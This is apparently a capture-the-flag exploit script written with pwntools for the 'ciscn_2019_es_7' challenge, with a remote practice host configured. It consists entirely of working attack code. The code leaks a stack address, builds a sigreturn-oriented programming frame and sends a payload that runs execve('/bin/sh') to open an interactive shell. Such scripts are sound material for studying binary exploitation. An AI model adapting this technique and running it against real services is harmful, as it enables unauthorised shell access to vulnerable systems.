from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["node4.buuoj.cn",26708]
libc=ELF('./libc-2.27.so')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./ciscn_2019_es_7")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

syscall = p64(0x400517)
mov_rax = p64(0x4004da)
xor_rax = p64(0x4004f1)
gdb.attach(p)
payload = b'/bin/sh\x00' * 2+ p64(0x4003a9)+ xor_rax
s(payload) 
rc(20)
stack = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
pr('stack', stack)
exe_frame = SigreturnFrame()
exe_frame.rax = 59
exe_frame.rdi = stack - 0x118
exe_frame.rsi = 0
exe_frame.rdx = 0
exe_frame.rsp = stack + 8
exe_frame.rip = 0x400517

s1 = b''
s1 += bytes(exe_frame)

payload = b'/bin/sh\x00' + p64(0) + mov_rax + syscall + s1
s(payload)

shell()
